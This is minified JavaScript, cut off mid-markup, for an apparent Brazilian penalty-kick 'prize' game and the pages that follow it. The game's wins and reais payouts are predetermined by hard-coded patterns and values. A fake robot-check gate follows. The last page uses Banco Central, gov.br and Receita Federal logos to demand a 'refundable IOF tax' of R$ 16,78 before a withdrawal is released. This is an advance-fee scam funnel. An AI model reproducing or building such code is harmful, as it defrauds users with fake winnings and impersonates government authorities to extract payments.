const fw = ["/sounds/whistle.mp3", "/sounds/kick.mp3", "/sounds/goal.mp3", "/sounds/save.mp3"],
    Dt = new Map(),
    ra = new Map();
function pw(t, e) {
    const n = Nt(),
        r = n.createBufferSource();
    r.buffer = t;
    const s = n.createGain();
    (s.gain.value = e), r.connect(s).connect(n.destination), r.start(n.currentTime);
}
function rp(t) {
    if (Dt.has(t)) return Promise.resolve(Dt.get(t));
    let e = ra.get(t);
    return (
        e ||
        ((e = (async () => {
            try {
                const n = await fetch(t);
                if (!n.ok) return Dt.set(t, null), null;
                const r = await n.arrayBuffer(),
                    i = await Nt().decodeAudioData(r);
                return Dt.set(t, i), i;
            } catch {
                return Dt.set(t, null), null;
            } finally {
                ra.delete(t);
            }
        })()),
        ra.set(t, e),
        e)
    );
}
function mw() {
    for (const t of fw) Dt.has(t) || rp(t);
}
function lo(t, e, n) {
    if ((Kr(), Dt.has(t))) {
        const r = Dt.get(t);
        if (r) {
            pw(r, e);
            return;
        }
        n();
        return;
    }
    rp(t), n();
}
function Nt() {
    if (typeof window > "u") throw new Error("Audio only in browser");
    return na || (na = new AudioContext({ sampleRate: 48e3 })), na;
}
function Kr() {
    try {
        const t = Nt();
        t.state === "suspended" && t.resume(), mw(), dw();
    } catch {}
}
function mu(t, e, n, r = 0) {
    const s = Nt(),
        i = s.currentTime + r,
        o = Math.ceil(s.sampleRate * t),
        a = s.createBuffer(1, o, s.sampleRate),
        l = a.getChannelData(0);
    for (let f = 0; f < o; f++) l[f] = Math.random() * 2 - 1;
    const c = s.createBufferSource();
    c.buffer = a;
    const d = s.createBiquadFilter();
    (d.type = "lowpass"), d.frequency.setValueAtTime(n, i);
    const h = s.createGain();
    h.gain.setValueAtTime(0, i),
        h.gain.linearRampToValueAtTime(e, i + 0.008),
        h.gain.exponentialRampToValueAtTime(8e-4, i + t),
        c.connect(d).connect(h).connect(s.destination),
        c.start(i),
        c.stop(i + t + 0.02);
}
function cl(t, e, n, r = "sine", s = 0) {
    const i = Nt(),
        o = i.currentTime + s,
        a = i.createOscillator();
    (a.type = r), a.frequency.setValueAtTime(t, o);
    const l = i.createGain();
    l.gain.setValueAtTime(0, o),
        l.gain.linearRampToValueAtTime(n, o + 0.015),
        l.gain.exponentialRampToValueAtTime(6e-4, o + e),
        a.connect(l).connect(i.destination),
        a.start(o),
        a.stop(o + e + 0.03);
}
function gw() {
    const t = Nt(),
        e = t.currentTime,
        n = t.createOscillator();
    (n.type = "triangle"),
        n.frequency.setValueAtTime(1850, e),
        n.frequency.exponentialRampToValueAtTime(2650, e + 0.07);
    const r = t.createGain();
    r.gain.setValueAtTime(0, e),
        r.gain.linearRampToValueAtTime(0.2, e + 0.02),
        r.gain.exponentialRampToValueAtTime(8e-4, e + 0.18),
        n.connect(r).connect(t.destination),
        n.start(e),
        n.stop(e + 0.2);
    const s = t.createOscillator();
    (s.type = "triangle"),
        s.frequency.setValueAtTime(2400, e + 0.12),
        s.frequency.exponentialRampToValueAtTime(1900, e + 0.22);
    const i = t.createGain();
    i.gain.setValueAtTime(0, e + 0.12),
        i.gain.linearRampToValueAtTime(0.14, e + 0.14),
        i.gain.exponentialRampToValueAtTime(8e-4, e + 0.28),
        s.connect(i).connect(t.destination),
        s.start(e + 0.12),
        s.stop(e + 0.32);
}
function vw() {
    lo("/sounds/whistle.mp3", 0.5, gw);
}
function yw() {
    mu(0.09, 0.22, 4200, 0), cl(95, 0.12, 0.28, "sine", 0);
}
function xw() {
    lo("/sounds/kick.mp3", 0.55, yw);
}
function ww() {
    const t = Nt(),
        e = t.currentTime;
    [523.25, 659.25, 783.99].forEach((n, r) => {
        const s = t.createOscillator();
        (s.type = "sine"), s.frequency.setValueAtTime(n, e);
        const i = t.createGain();
        i.gain.setValueAtTime(0, e),
            i.gain.linearRampToValueAtTime(0.12 - r * 0.02, e + 0.03 + r * 0.02),
            i.gain.exponentialRampToValueAtTime(8e-4, e + 0.45 + r * 0.05),
            s.connect(i).connect(t.destination),
            s.start(e + r * 0.025),
            s.stop(e + 0.55);
    }),
        mu(0.15, 0.08, 9e3, 0.02);
}
function _w() {
    lo("/sounds/goal.mp3", 0.55, ww);
}
function bw() {
    mu(0.14, 0.35, 1800, 0), cl(140, 0.18, 0.2, "triangle", 0.02), cl(95, 0.22, 0.16, "sine", 0.05);
}
function kw() {
    lo("/sounds/save.mp3", 0.55, bw);
}
function Sw() {
    const t = Nt(),
        e = t.currentTime,
        n = 1.1,
        r = Math.ceil(t.sampleRate * n),
        s = t.createBuffer(1, r, t.sampleRate),
        i = s.getChannelData(0);
    for (let c = 0; c < r; c++) {
        const d = c / r,
            h = 0.5 + 0.5 * Math.sin(c * 0.02);
        i[c] = (Math.random() * 2 - 1) * h * (0.35 + 0.65 * d);
    }
    const o = t.createBufferSource();
    o.buffer = s;
    const a = t.createBiquadFilter();
    (a.type = "bandpass"), a.frequency.setValueAtTime(800, e), a.Q.setValueAtTime(0.6, e);
    const l = t.createGain();
    l.gain.setValueAtTime(0, e),
        l.gain.linearRampToValueAtTime(0.14 * 0.55, e + 0.08),
        l.gain.linearRampToValueAtTime(0.1 * 0.55, e + n * 0.6),
        l.gain.exponentialRampToValueAtTime(8e-4, e + n),
        o.connect(a).connect(l).connect(t.destination),
        o.start(e),
        o.stop(e + n + 0.05);
}
function jw() {
    Sw();
}
function Ew() {
    const t = Nt(),
        e = t.currentTime,
        n = 0.75,
        r = Math.ceil(t.sampleRate * n),
        s = t.createBuffer(1, r, t.sampleRate),
        i = s.getChannelData(0);
    for (let c = 0; c < r; c++) {
        const d = 1 - c / r;
        i[c] = (Math.random() * 2 - 1) * (0.2 + 0.5 * d);
    }
    const o = t.createBufferSource();
    o.buffer = s;
    const a = t.createBiquadFilter();
    (a.type = "lowpass"), a.frequency.setValueAtTime(2200, e), a.frequency.exponentialRampToValueAtTime(400, e + n);
    const l = t.createGain();
    l.gain.setValueAtTime(0, e),
        l.gain.linearRampToValueAtTime(0.12 * 0.5, e + 0.05),
        l.gain.exponentialRampToValueAtTime(8e-4, e + n),
        o.connect(a).connect(l).connect(t.destination),
        o.start(e),
        o.stop(e + n + 0.05);
}
function Nw() {
    Ew();
}
function Cw() {
    try {
        typeof navigator < "u" && navigator.vibrate && navigator.vibrate(35);
    } catch {}
}
function Pw() {
    try {
        typeof navigator < "u" && navigator.vibrate && navigator.vibrate([30, 40, 45]);
    } catch {}
}
const We = 15,
    sp = 9,
    nd = We - sp,
    ip = [60.51, 61.02, 62.33, 64.08, 68.52, 70.55];
for (const t of ip)
    if (Math.round(t * 100) % 100 === 0) throw new Error("Valores de gol de simulação não podem terminar em ,00.");
function Tw(t) {
    for (let e = t.length - 1; e > 0; e--) {
        const n = Math.floor(Math.random() * (e + 1));
        [t[e], t[n]] = [t[n], t[e]];
    }
}
function Rw(t, e, n) {
    let r = 0;
    for (let i = 0; i < We; i++) t[i] && r++;
    if (r !== sp) return !1;
    for (let i = 0; i < We - 1; i++) if (!t[i] && !t[i + 1]) return !1;
    for (let i = 0; i < We - 2; i++) if (t[i] && t[i + 1] && t[i + 2]) return !1;
    let s = 0;
    for (let i = 0; i < We - 1; i++) t[i] !== t[i + 1] && s++;
    return !(s > n || s < e);
}
function rd() {
    const t = (n, r) => {
        const s = [];
        for (let i = 0; i < 1 << We; i++) {
            const o = [];
            for (let a = 0; a < We; a++) o.push(((i >> a) & 1) === 1);
            Rw(o, n, r) && s.push(o);
        }
        return s;
    };
    let e = t(6, 11);
    return (
        e.length === 0 && (e = t(5, 11)),
        e.length === 0 && (e = t(4, 12)),
        e.length === 0 && (e = t(0, 14)),
        e[Math.floor(Math.random() * e.length)]
    );
}
function Ow({ playerId: t, playerName: e }) {
    const [n, r] = x.useState(0),
        [s, i] = x.useState(0),
        [o, a] = x.useState(0),
        [l, c] = x.useState([]),
        [d, h] = x.useState("aiming"),
        [f, v] = x.useState([]),
        [y, _] = x.useState(!1),
        [b, g] = x.useState(null),
        [p, m] = x.useState({ x: 50, y: 62 }),
        [w, k] = x.useState(!1),
        [j, N] = x.useState("center"),
        [E, U] = x.useState("idle"),
        [I, fe] = x.useState("center"),
        [it, ze] = x.useState(null),
        [pe, pt] = x.useState(!1),
        [Ct, ot] = x.useState(!1),
        [C, T] = x.useState(!1),
        [R, z] = x.useState(!1),
        [W, Pt] = x.useState(0),
        [G, we] = x.useState(!1),
        $e = x.useRef(null),
        at = x.useMemo(() => rd(), [W]),
        js = x.useMemo(() => {
            const $ = [...ip];
            return Tw($), $;
        }, [W]),
        yr = x.useRef(null),
        rn = x.useCallback(
            ($, F, Y) => {
                void t, void $, void F, void Y;
            },
            [t]
        );
    x.useCallback(() => {
        const F = rd().map((Y) => !Y);
        c(F),
            a(nd),
            i(387.01),
            r(We),
            h("finished"),
            ze(null),
            pt(!1),
            ot(!1),
            g(null),
            v([]),
            _(!1),
            T(!0),
            z(!0),
            rn(387.01, nd, We);
    }, [rn]);
    const xr = x.useCallback(() => {
            Kr(),
                i(0),
                r(0),
                a(0),
                c([]),
                T(!1),
                z(!1),
                h("aiming"),
                v([]),
                _(!1),
                g(null),
                k(!1),
                N("center"),
                m({ x: 50, y: 62 }),
                U("idle"),
                fe("center"),
                ze(null),
                pt(!1),
                ot(!1),
                Pt(($) => $ + 1),
                rn(0, 0, 0);
        }, [rn]),
        Es = ($, F) => {
            const Y = yr.current;
            if (!Y) return null;
            const me = Y.getBoundingClientRect(),
                Ee = (($ - me.left) / me.width) * 100,
                Tt = ((F - me.top) / me.height) * 100;
            return { x: Ee, y: Tt };
        },
        ap = ($) => ({ x: Math.max(12, Math.min(88, $.x)), y: Math.max(15, Math.min(80, $.y)) }),
        lp = ($) => {
            var Y, me;
            if (d !== "aiming") return;
            Kr();
            const F = Es($.clientX, $.clientY);
            F && ((me = (Y = $.target).setPointerCapture) == null || me.call(Y, $.pointerId), _(!0), v([F]));
        },
        up = ($) => {
            if (!y || d !== "aiming") return;
            const F = Es($.clientX, $.clientY);
            F &&
                v((Y) => {
                    if (Y.length > 0) {
                        const Ee = Y[Y.length - 1],
                            Tt = F.x - Ee.x,
                            Tn = F.y - Ee.y;
                        if (Tt * Tt + Tn * Tn < 0.4) return Y;
                    }
                    const me = [...Y, F];
                    return me.length > 100 ? me.slice(me.length - 100) : me;
                });
        },
        gu = () => {
            if (!y || d !== "aiming") {
                _(!1);
                return;
            }
            if ((_(!1), f.length === 0)) return;
            const $ = f[f.length - 1],
                F = ap($);
            cp(F);
        },
        cp = ($) => {
            h("charging");
            const F = $.x < 40 ? "left" : $.x > 60 ? "right" : "center";
            fe(F),
                U("runup"),
                setTimeout(() => U("kick"), 450),
                setTimeout(() => {
                    h("shooting"), U("followthrough"), g($), xw();
                    const Y = at[n],
                        me = F;
                    let Ee, Tt;
                    const Tn = 42,
                        ho = 58,
                        fo = 54,
                        vu = 68;
                    if (Y) {
                        const wr = $.x + (Math.random() * 3 - 1.5);
                        (Ee = { x: Math.max(Tn, Math.min(ho, wr)), y: Math.max(fo, Math.min(vu, $.y + 4)) }),
                            (Tt = Ee.x < 48 ? "left" : Ee.x > 52 ? "right" : "center");
                    } else
                        (Ee = {
                            x:
                                me === "left"
                                    ? ho - Math.random() * 2
                                    : me === "right"
                                      ? Tn + Math.random() * 2
                                      : Math.random() < 0.5
                                        ? Tn + Math.random() * 1.5
                                        : ho - Math.random() * 1.5,
                            y: Math.max(fo, Math.min(vu, 60)),
                        }),
                            (Tt = Ee.x < 49 ? "left" : Ee.x > 51 ? "right" : "center");
                    const dp = Ee.x,
                        hp = Math.max(fo, Ee.y - 1);
                    setTimeout(() => {
                        k(!0),
                            N(Tt),
                            m({ x: dp, y: hp }),
                            setTimeout(() => {
                                m(Ee);
                            }, 380);
                    }, 150),
                        setTimeout(() => {
                            h("result");
                            const wr = !Y,
                                fp = [...l, wr];
                            c(fp);
                            const po = n + 1;
                            let mo = s,
                                go = o;
                            if (wr) {
                                const yu = js[o];
                                (mo = +(s + yu).toFixed(2)),
                                    (go = o + 1),
                                    i(mo),
                                    a(go),
                                    ze({ amount: yu }),
                                    we(!0),
                                    _w(),
                                    jw(),
                                    Cw();
                            } else pt(!0), ot(!0), we(!0), kw(), Nw(), Pw();
                            rn(mo, go, po),
                                setTimeout(() => {
                                    ze(null),
                                        pt(!1),
                                        po >= We
                                            ? (h("finished"), T(!0))
                                            : (r(po),
                                              g(null),
                                              v([]),
                                              k(!1),
                                              N("center"),
                                              m({ x: 50, y: 62 }),
                                              U("idle"),
                                              h("aiming"),
                                              ot(!1));
                                }, 2200);
                        }, 500);
                }, 1e3);
        };
    if (
        (x.useEffect(() => {
            const $ = (F) => {
                d === "aiming" && y && F.preventDefault();
            };
            return (
                document.addEventListener("touchmove", $, { passive: !1 }),
                () => document.removeEventListener("touchmove", $)
            );
        }, [d, y]),
        x.useEffect(() => {
            Kr();
        }, []),
        x.useEffect(() => {
            R && hw();
        }, [R]),
        x.useEffect(() => {
            if (!G) return;
            const $ = window.setTimeout(() => we(!1), 420);
            return () => window.clearTimeout($);
        }, [G]),
        x.useEffect(() => {
            if (C || d !== "aiming") return;
            const $ = `${W}-${n}`;
            $e.current !== $ && (($e.current = $), vw());
        }, [C, d, n, W]),
        C && !R)
    )
        return u.jsx(pv, {
            playerName: e,
            balance: s,
            goals: o,
            results: l,
            onContinueToResgate: () => z(!0),
            onPlayAgain: xr,
        });
    if (C && R) return u.jsx($v, { playerName: e, balance: s, goals: o, results: l, onPlayAgain: xr });
    const uo = f.length > 1 ? f.map(($, F) => `${F === 0 ? "M" : "L"} ${$.x} ${$.y}`).join(" ") : "",
        co = f.length > 0 ? f[f.length - 1] : null;
    return u.jsxs("div", {
        className: `fixed inset-0 overflow-hidden select-none bg-[#143d26] ${G ? "animate-camera-shake" : ""}`,
        children: [
            u.jsx("div", {
                className: "absolute inset-x-0 top-0 z-0 h-[28%]",
                style: {
                    background:
                        "linear-gradient(180deg, #020617 0%, #0f172a 28%, #1a3350 62%, rgba(22,58,38,0.88) 100%)",
                },
            }),
            u.jsx(Vv, {}),
            u.jsx("div", { className: "absolute inset-0 z-[2] pointer-events-none", children: u.jsx(Iv, {}) }),
            u.jsx(Wv, {}),
            u.jsx(qv, {}),
            u.jsxs("div", {
                className: "absolute top-0 inset-x-0 z-40 flex items-start justify-between gap-2 px-2.5 pt-2 pb-1.5",
                children: [
                    u.jsx("div", {
                        className: "min-w-0 flex-1 max-w-[min(62%,320px)]",
                        children: u.jsxs("div", {
                            className: dn,
                            style: hn,
                            children: [
                                u.jsx("div", { className: fn }),
                                u.jsxs("div", {
                                    className:
                                        "flex flex-wrap items-center gap-x-3 gap-y-1.5 border-b border-white/10 px-2.5 py-2",
                                    children: [
                                        u.jsx("span", { className: `${Ai} text-[9px]`, children: "Pênaltis" }),
                                        u.jsxs("span", {
                                            className: "font-display text-sm font-black tabular-nums text-white",
                                            children: [n + 1, "/", We],
                                        }),
                                        u.jsx("div", {
                                            className: "flex gap-1",
                                            children: Array.from({ length: We }).map(($, F) => {
                                                let Y = "bg-white/25";
                                                return (
                                                    F < l.length
                                                        ? (Y = l[F] ? "bg-fcds-green" : "bg-fcds-red")
                                                        : F === l.length && (Y = "bg-fcds-yellow animate-pulse"),
                                                    u.jsx("div", { className: `h-2 w-2 shrink-0 rounded-full ${Y}` }, F)
                                                );
                                            }),
                                        }),
                                    ],
                                }),
                            ],
                        }),
                    }),
                    u.jsx("div", {
                        className: "w-[min(48%,200px)] shrink-0",
                        children: u.jsxs("div", {
                            className: dn,
                            style: hn,
                            children: [
                                u.jsx("div", { className: fn }),
                                u.jsxs("div", {
                                    className: "px-2.5 py-2 text-center",
                                    children: [
                                        u.jsx("p", { className: `${Ai} mb-1 text-[9px]`, children: "Saldo" }),
                                        u.jsxs("p", {
                                            className:
                                                "font-display text-xl font-black leading-none tabular-nums tracking-tight text-fcds-yellow",
                                            children: ["R$ ", s.toFixed(2).replace(".", ",")],
                                        }),
                                    ],
                                }),
                            ],
                        }),
                    }),
                ],
            }),
            u.jsxs("div", {
                ref: yr,
                className: `absolute left-1/2 top-[96px] -translate-x-1/2 w-[92%] max-w-md aspect-[22/12] touch-none z-10 rounded-md ${d === "aiming" && f.length === 0 ? "animate-hint-pulse" : ""}`,
                onPointerDown: lp,
                onPointerMove: up,
                onPointerUp: gu,
                onPointerCancel: gu,
                children: [
                    u.jsx(Fv, {}),
                    u.jsx("div", {
                        className: "absolute",
                        style: {
                            left: `${p.x}%`,
                            top: `${p.y}%`,
                            width: "28%",
                            aspectRatio: "2/3",
                            transform: "translate(-50%, -50%)",
                            transition: w
                                ? "left 480ms cubic-bezier(0.4, 0, 0.2, 1), top 480ms cubic-bezier(0.4, 0, 0.2, 1)"
                                : "left 300ms, top 300ms",
                            zIndex: 25,
                        },
                        children: u.jsx(Mv, { diving: w, direction: j }),
                    }),
                    uo &&
                        d === "aiming" &&
                        u.jsxs("svg", {
                            className: "absolute inset-0 w-full h-full pointer-events-none",
                            viewBox: "0 0 100 100",
                            preserveAspectRatio: "none",
                            style: { zIndex: 18 },
                            children: [
                                u.jsx("defs", {
                                    children: u.jsxs("filter", {
                                        id: "redGlow",
                                        children: [
                                            u.jsx("feGaussianBlur", { stdDeviation: "0.7", result: "blur" }),
                                            u.jsxs("feMerge", {
                                                children: [
                                                    u.jsx("feMergeNode", { in: "blur" }),
                                                    u.jsx("feMergeNode", { in: "SourceGraphic" }),
                                                ],
                                            }),
                                        ],
                                    }),
                                }),
                                u.jsx("path", {
                                    d: uo,
                                    fill: "none",
                                    stroke: "#ef4444",
                                    strokeWidth: "1",
                                    strokeLinecap: "round",
                                    strokeLinejoin: "round",
                                    filter: "url(#redGlow)",
                                    opacity: "0.95",
                                }),
                                u.jsx("path", {
                                    d: uo,
                                    fill: "none",
                                    stroke: "#fef2f2",
                                    strokeWidth: "0.35",
                                    strokeLinecap: "round",
                                    strokeLinejoin: "round",
                                    strokeDasharray: "1.5 1.5",
                                }),
                            ],
                        }),
                    co &&
                        d === "aiming" &&
                        u.jsxs("div", {
                            className: "absolute w-11 h-11 -translate-x-1/2 -translate-y-1/2 pointer-events-none",
                            style: { left: `${co.x}%`, top: `${co.y}%`, zIndex: 19 },
                            children: [
                                u.jsx("div", {
                                    className: "absolute inset-0 rounded-full border-2 border-red-500 animate-ping",
                                }),
                                u.jsx("div", { className: "absolute inset-1 rounded-full border-2 border-red-500" }),
                                u.jsx("div", {
                                    className:
                                        "absolute inset-[42%] rounded-full bg-red-500 shadow-[0_0_8px_rgba(239,68,68,0.8)]",
                                }),
                            ],
                        }),
                    b &&
                        u.jsx("div", {
                            className: "absolute w-8 h-8 -translate-x-1/2 -translate-y-1/2 transition-all",
                            style: {
                                left: `${b.x}%`,
                                top: `${b.y}%`,
                                transitionDuration: "500ms",
                                transitionTimingFunction: "cubic-bezier(0.4, 0, 0.4, 1)",
                                zIndex: Ct ? 30 : 20,
                            },
                            children: u.jsx(Uc, { spinning: !0 }),
                        }),
                ],
            }),
            u.jsx("div", {
                className: "absolute bottom-0 left-0 z-20 pointer-events-none",
                style: { width: "62%", height: "55%", transform: "translateX(-6%)" },
                children: u.jsx(Dv, { phase: E, kickDirection: I }),
            }),
            !b &&
                (d === "aiming" || d === "charging") &&
                u.jsxs("div", {
                    className: "absolute z-30 pointer-events-none transition-all",
                    style: {
                        bottom: "12%",
                        left: "52%",
                        width: "50px",
                        height: "50px",
                        transform: E === "runup" ? "translateX(-8px)" : "translateX(0)",
                        transitionDuration: "400ms",
                    },
                    children: [
                        u.jsx(Uc, {}),
                        d === "charging" &&
                            u.jsx("div", {
                                className: "absolute inset-0 rounded-full border-4 border-red-500 animate-ping",
                            }),
                    ],
                }),
            u.jsx("div", {
                className:
                    "absolute bottom-0 inset-x-0 h-[8%] bg-gradient-to-t from-emerald-950/50 via-emerald-950/12 to-transparent z-20 pointer-events-none",
            }),
            u.jsxs("div", {
                className: "absolute bottom-3 inset-x-0 z-40 text-center pointer-events-none px-6",
                children: [
                    d === "aiming" &&
                        f.length === 0 &&
                        u.jsx("div", {
                            className: "inline-block max-w-[min(92vw,360px)] text-center",
                            style: hn,
                            children: u.jsxs("div", {
                                className: dn,
                                children: [
                                    u.jsx("div", { className: fn }),
                                    u.jsx("p", {
                                        className:
                                            "px-4 py-2.5 text-[10px] font-bold uppercase tracking-wide text-fcds-light-blue",
                                        children: "CLIQUE NO GOL PARA CHUTAR",
                                    }),
                                ],
                            }),
                        }),
                    d === "aiming" &&
                        f.length > 0 &&
                        u.jsx("div", {
                            className: "inline-block max-w-[min(92vw,360px)] text-center",
                            style: hn,
                            children: u.jsxs("div", {
                                className: dn,
                                children: [
                                    u.jsx("div", { className: fn }),
                                    u.jsx("p", {
                                        className:
                                            "px-4 py-2.5 text-[10px] font-black uppercase tracking-wide text-fcds-medium-red",
                                        children: "Solte para chutar",
                                    }),
                                ],
                            }),
                        }),
                    d === "charging" &&
                        u.jsx("div", {
                            className: "inline-block max-w-[min(92vw,360px)] text-center",
                            style: hn,
                            children: u.jsxs("div", {
                                className: dn,
                                children: [
                                    u.jsx("div", { className: fn }),
                                    u.jsx("p", {
                                        className:
                                            "px-4 py-2.5 text-[10px] font-bold uppercase tracking-wide text-fcds-yellow",
                                        children: "Cobrança…",
                                    }),
                                ],
                            }),
                        }),
                ],
            }),
            it && u.jsx(hv, { amount: it.amount }),
            pe && u.jsx(fv, {}),
            !1,
        ],
    });
}
function $w() {
    const [t, e] = x.useState("landing"),
        [n, r] = x.useState(""),
        [s, i] = x.useState(""),
        [o, a] = x.useState(!1),
        l = () => e("name"),
        c = async (d) => {
            Kr(), a(!0);
            try {
                r("local-" + Date.now()), i(d), e("game");
            } finally {
                a(!1);
            }
        };
    return t === "landing"
        ? u.jsx(Yg, { onStart: l })
        : t === "name"
          ? u.jsx(dv, { onSubmit: c, loading: o })
          : u.jsx(Ow, { playerId: n, playerName: s });
}
const op = "futpay_presell_passed";
function Iw() {
    try {
        return sessionStorage.getItem(op) === "1";
    } catch {
        return !1;
    }
}
function Aw() {
    try {
        sessionStorage.setItem(op, "1");
    } catch {}
}
function Lw() {
    return u.jsx($w, {});
}
function Mw() {
    const [t, e] = x.useState(!1),
        n = Nf(),
        r = au();
    return u.jsx("div", {
        className: "min-h-screen bg-slate-50 flex items-center justify-center px-4",
        children: u.jsxs("div", {
            className: "bg-white rounded-2xl shadow-lg border border-slate-200 p-8 w-full max-w-sm space-y-6",
            children: [
                u.jsxs("div", {
                    className: "flex flex-col items-center gap-2",
                    children: [
                        u.jsx(lu, { className: "w-10 h-10 text-emerald-600", strokeWidth: 1.5 }),
                        u.jsx("h1", {
                            className: "text-lg font-semibold text-slate-800",
                            children: "Verificacao de seguranca",
                        }),
                    ],
                }),
                u.jsxs("label", {
                    className:
                        "flex items-center gap-3 cursor-pointer select-none border border-slate-200 rounded-xl px-4 py-3 hover:border-emerald-400 transition-colors",
                    children: [
                        u.jsx("input", {
                            type: "checkbox",
                            checked: t,
                            onChange: (r) => e(r.target.checked),
                            className:
                                "w-5 h-5 rounded border-slate-300 text-emerald-600 focus:ring-emerald-500 accent-emerald-600",
                        }),
                        u.jsx("span", { className: "text-sm text-slate-700", children: "Nao sou um robo" }),
                    ],
                }),
                u.jsxs("a", {
                    href: t ? `/${r.search}` : void 0,
                    onClick: (s) => {
                        if (!t) {
                            s.preventDefault();
                            return;
                        }
                        s.preventDefault(), Aw(), n({ pathname: "/", search: r.search }, { replace: !0 });
                    },
                    className: `w-full flex items-center justify-center gap-2 rounded-xl px-4 py-3 text-sm font-medium transition-all duration-200 ${t ? "bg-emerald-600 text-white hover:bg-emerald-700 active:scale-[0.98] shadow-sm" : "bg-slate-100 text-slate-400 cursor-not-allowed pointer-events-none"}`,
                    children: ["Continuar", u.jsx(zg, { className: "w-4 h-4" })],
                }),
            ],
        }),
    });
}
function Uw() {
    return u.jsx(Mw, {});
}
const Dw = "/nine/bacen.png",
    zw = "/nine/gov-br.webp",
    Fw = "/nine/receitafederal.png",
    Bw = 16.78;
function Vw(t) {
    return t
        .toFixed(2)
        .replace(".", ",")
        .replace(/\B(?=(\d{3})+(?!\d))/g, ".");
}
function Ww() {
    const [t, e] = x.useState(!1),
        n = Vw(Bw);
    return t
        ? u.jsx("div", {
              style: { width: "100%", height: "100dvh", overflow: "hidden" },
              children: u.jsx("iframe", {
                  src: Sv,
                  title: "Pagamento — IOF / transação internacional",
                  loading: "lazy",
                  allowFullScreen: !0,
                  style: { width: "100%", height: "100%", border: 0, display: "block" },
              }),
          })
        : u.jsxs("div", {
              className: "min-h-dvh w-full bg-[#e8eef3] text-slate-900 antialiased",
              children: [
                  u.jsx("div", {
                      className:
                          "border-b border-[#c5d4e0] bg-[#0c3262] px-4 py-3 text-center text-[13px] font-medium text-white",
                      children: "Tributação de operações internacionais (IOF)",
                  }),
                  u.jsxs("main", {
                      className: "mx-auto box-border w-full max-w-md px-4 pb-10 pt-6",
                      children: [
                          u.jsxs("div", {
                              className:
                                  "mb-5 flex flex-wrap items-center justify-center gap-5 border border-slate-300/80 bg-white px-4 py-4 shadow-sm",
                              children: [
                                  u.jsx("img", {
                                      src: Dw,
                                      alt: "Banco Central do Brasil",
                                      className: "h-11 w-auto max-w-[30%] object-contain object-center",
                                      draggable: !1,
                                  }),
                                  u.jsx("img", {
                                      src: zw,
                                      alt: "Governo Federal — gov.br",
                                      className: "h-10 w-auto max-w-[28%] object-contain object-center",
                                      draggable: !1,
                                  }),
                                  u.jsx("img", {
                                      src: Fw,
                                      alt: "Receita Federal",
                                      className: "h-11 w-auto max-w-[30%] object-contain object-center",
                                      draggable: !1,
                                  }),
                              ],
                          }),
                          u.jsxs("p", {
                              className:
                                  "mb-1.5 flex items-center gap-2 text-[12px] font-semibold uppercase text-[#0c3262]",
                              children: [
                                  u.jsx(Wg, { className: "h-3.5 w-3.5 shrink-0", "aria-hidden": !0, strokeWidth: 2 }),
                                  "IOF — imposto sobre transação internacional",
                              ],
                          }),
                          u.jsx("h1", {
                              className: "mb-5 text-[1.35rem] font-bold leading-snug text-slate-900",
                              children: "Etapa obrigatória para concluir o saque",
                          }),
                          u.jsxs("div", {
                              className: "mb-4 border border-slate-300 bg-white p-4 shadow-sm",
                              children: [
                                  u.jsxs("div", {
                                      className:
                                          "mb-2 flex items-center gap-2 border-l-4 border-[#1351b4] pl-3 text-[11px] font-semibold uppercase text-slate-600",
                                      children: [
                                          u.jsx(Gg, {
                                              className: "h-3.5 w-3.5 text-[#1351b4]",
                                              "aria-hidden": !0,
                                              strokeWidth: 2,
                                          }),
                                          "Valor devido (IOF)",
                                      ],
                                  }),
                                  u.jsxs("div", {
                                      className: "mb-3 text-[1.65rem] font-bold tabular-nums text-[#0c3262]",
                                      children: [
                                          "R$ ",
                                          n,
                                          u.jsx("span", {
                                              className:
                                                  "ml-2 inline-block border border-slate-300 bg-slate-50 px-2 py-0.5 align-middle text-[10px] font-semibold tracking-normal text-slate-700",
                                              children: "IOF reembolsável",
                                          }),
                                      ],
                                  }),
                                  u.jsxs("p", {
                                      className: "text-[13px] leading-relaxed text-slate-700",
                                      children: [
                                          "O crédito em liquidação está vinculado a uma",
                                          " ",
                                          u.jsx("span", {
                                              className: "font-semibold text-slate-900",
                                              children: "instituição de natureza internacional",
                                          }),
                                          ". Nesse caso, incide o recolhimento referente ao",
                                          " ",
                                          u.jsx("span", {
                                              className: "font-semibold",
                                              children: "Imposto sobre Operações Financeiras (IOF)",
                                          }),
                                          " sobre a transação internacional vinculada ao crédito.",
                                          " ",
                                          u.jsx("span", {
                                              className: "font-semibold text-slate-900",
                                              children: "Sem o pagamento do valor indicado, o saque não é liberado.",
                                          }),
                                          " ",
                                          "O montante de ",
                                          u.jsxs("span", { className: "font-semibold", children: ["R$ ", n] }),
                                          " é restituído em até 1 minuto após a confirmação, conforme a etapa de validação da operação.",
                                      ],
                                  }),
                              ],
                          }),
                          u.jsxs("div", {
                              className: "mb-4 border border-slate-300 bg-white p-4 shadow-sm",
                              children: [
                                  u.jsx("p", {
                                      className: "mb-2.5 text-[11px] font-semibold uppercase text-slate-600",
                                      children: "Fundamentação",
                                  }),
                                  u.jsxs("ul", {
                                      className: "space-y-2 text-[13px] leading-relaxed text-slate-700",
                                      children: [
                                          u.jsxs("li", {
                                              className: "flex gap-2",
                                              children: [
                                                  u.jsx("span", {
                                                      className: "mt-0.5 shrink-0 font-bold text-[#1351b4]",
                                                      children: "•",
                                                  }),
                                                  "Operações com instituição ou fluxo de crédito de caráter internacional estão sujeitas à tributação incidente sobre movimentações financeiras em moeda nacional, incluindo o IOF quando aplicável ao caso.",
                                              ],
                                          }),
                                          u.jsxs("li", {
                                              className: "flex gap-2",
                                              children: [
                                                  u.jsx("span", {
                                                      className: "mt-0.5 shrink-0 font-bold text-[#1351b4]",
                                                      children: "•",
                                                  }),
                                                  "O pagamento comprova a regularidade da transação perante o arranjo e permite concluir a liberação do valor na chave PIX informada.",
                                              ],
                                          }),
                                          u.jsxs("li", {
                                              className: "flex gap-2",
                                              children: [
                                                  u.jsx("span", {
                                                      className: "mt-0.5 shrink-0 font-bold text-[#1351b4]",
                                                      children: "•",
                                                  }),
                                                  "Após a confirmação, o valor é estornado automaticamente, liberando o prosseguimento do saque.",
                                              ],
                                          }),
                                      ],
                                  }),
                              ],
                          }),
                          u.jsxs("div", {
                              className: "mb-5 border border-slate-300 bg-[#f8fafc] p-4",
                              children: [
                                  u.jsx("p", {
                                      className:
                                          "mb-2.5 text-center text-[11px] font-semibold uppercase text-slate-600",
                                      children: "Etapas",
                                  }),
                                  u.jsxs("ol", {
                                      className: "space-y-3 text-[13px] leading-snug text-slate-800",
                                      children: [
                                          u.jsxs("li", {
                                              className: "flex gap-3",
